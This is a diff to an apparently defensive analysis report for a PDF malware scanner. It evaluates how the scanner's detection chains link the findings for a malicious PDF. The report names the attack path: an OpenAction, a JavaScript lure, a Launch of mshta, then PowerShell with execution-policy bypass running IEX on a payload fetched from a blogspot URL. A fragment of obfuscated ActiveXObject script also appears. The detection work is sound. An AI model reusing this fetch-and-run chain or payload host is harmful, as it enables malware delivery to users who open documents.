@@ -109,15 +109,12 @@ ghi=new ActiveXObject(abc[0]);ghi[abc[1]](abc[2],abc[3],abc[4],abc[5],abc[6]);cl
 
 ## Chain Assessment
 
-The top chain "Automatic action trigger -> OpenAction -> action [launch_target] (13 0)" (score=0.95, completeness=0.4, 1 edge) captures the OpenAction→Launch link but stops there. The "Launch action present -> mshta" chain (score=0.95, completeness=0.2, 5 edges) captures the mshta surface. However, no single chain represents the full kill path:
+Updated deep scan on 2026-02-28 (post-uplift) shows a material closure of the launch-chain gap:
 
-**Expected end-to-end chain**:
-`OpenAction` → `JS social engineering alert` → `Launch(mshta)` → `PowerShell -ep Bypass` → `IEX(IrM blogspot.com/phudi.pdf)`
+- `launch_win_embedded_url` now fires (count=1) with `launch.embedded_url=https://hotelmay21.blogspot.com////phudi.pdf`
+- `/Launch /Win` values are parsed into `launch.win.f`, `launch.win.p`, `launch.win.d`, `launch.win.o`
+- The top launch chain is now a 5-finding chain (`score=0.95`) covering Launch + embedded URL payload evidence
 
-**Gaps**:
-1. `powershell_payload_present` is a separate singleton chain (score 0.9, 0 edges) — not linked to launch
-2. The C2 URL (`hotelmay21.blogspot.com`) is not extracted into a `uri_action` or `external_resource` finding
-3. The ObjStm that hosts the payload is not referenced as an evasion stage in the chain
-4. `js_intent_user_interaction` (the lure) is not linked to the launch action as a social-engineering precondition
+Residual gap: the full social-engineering-to-execution narrative is still split across chains. `js_intent_user_interaction` and some renderer-evasion findings are not yet folded into one canonical end-to-end chain.
 
-These gaps are documented in `plans/20260228-corpus-analysis-uplift.md`.
+Related plan tracking: `plans/20260228-corpus-perf-chain-uplift.md`.
